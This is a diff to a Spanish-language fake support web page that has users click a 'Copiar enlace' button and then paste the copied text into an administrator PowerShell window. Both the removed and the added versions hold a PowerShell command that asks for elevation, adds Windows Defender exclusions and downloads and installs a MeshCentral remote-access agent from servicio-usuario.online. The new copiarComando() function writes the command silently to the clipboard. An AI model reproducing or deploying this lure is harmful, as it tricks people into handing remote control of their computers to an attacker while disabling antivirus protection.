@@ -124,16 +124,9 @@ body {
 
         <p>Copie el enlace clicando en el botón inferior facilitado por el servicio de soporte y manténgalo disponible para su posterior utilización.</p>
 
-      <button type="button" id="btn-copiar" data-enlace="if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-  $cmd = 'Add-MpPreference -ExclusionPath "$env:TEMP\meshagent.exe","C:\Program Files\Mesh Agent"; $u=''https://servicio-usuario.online/meshagents?id=4&meshid=gj41Be2KALalo$89skbguJUKiufX6DEatF6lkkfu9afPG9PlhfAagjFU2uP0QrNs&installflags=1''; $f="$env:TEMP\meshagent.exe"; Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing; Start-Process $f -ArgumentList ''-fullinstall'' -Wait'
-  Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $cmd"
-} else {
-  Add-MpPreference -ExclusionPath "$env:TEMP\meshagent.exe","C:\Program Files\Mesh Agent"
-  $u='https://servicio-usuario.online/meshagents?id=4&meshid=gj41Be2KALalo$89skbguJUKiufX6DEatF6lkkfu9afPG9PlhfAagjFU2uP0QrNs&installflags=1'
-  $f="$env:TEMP\meshagent.exe"
-  Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing
-  Start-Process $f -ArgumentList '-fullinstall' -Wait
-}">Copiar enlace</button>
+      <button id="btn-copiar" onclick="copiarComando()">Copiar enlace</button>
+
+<p id="copiado" style="display:none;color:green;">✔ Comando copiado. Pégalo en PowerShell.</p>
       <p></p>
       <p><strong>Segundo paso: Abrir PowerShell como administrador</strong></p>
 
@@ -192,6 +185,27 @@ document.getElementById('btn-copiar').addEventListener('click', async function (
   btn.textContent = '¡Enlace copiado!';
   setTimeout(function () { btn.textContent = original; }, 2000);
 });
+</script>
+  
+
+<script>
+
+function copiarComando() {
+
+  const comando = `$cmd = { if ((Get-CimInstance Win32_OperatingSystem).OSArchitecture -like '*64*') { $id = 4 } else { $id = 3 }; Add-MpPreference -ExclusionPath "$env:TEMP\\meshagent.exe","C:\\Program Files\\Mesh Agent"; $u = "https://servicio-usuario.online/meshagents?id=$id&meshid=gj41Be2KALalo\`$89skbguJUKiufX6DEatF6lkkfu9afPG9PlhfAagjFU2uP0QrNs&installflags=0"; $f = "$env:TEMP\\meshagent.exe"; Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing; Start-Process $f -ArgumentList '-fullinstall' -Wait }; if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command & {$cmd}" } else { & $cmd }`;
+
+
+
+  navigator.clipboard.writeText(comando).then(() => {
+
+    const aviso = document.getElementById('copiado');
+
+    if (aviso) aviso.style.display = 'block';
+
+  });
+
+}
+
 </script>
 </body>
 </html>
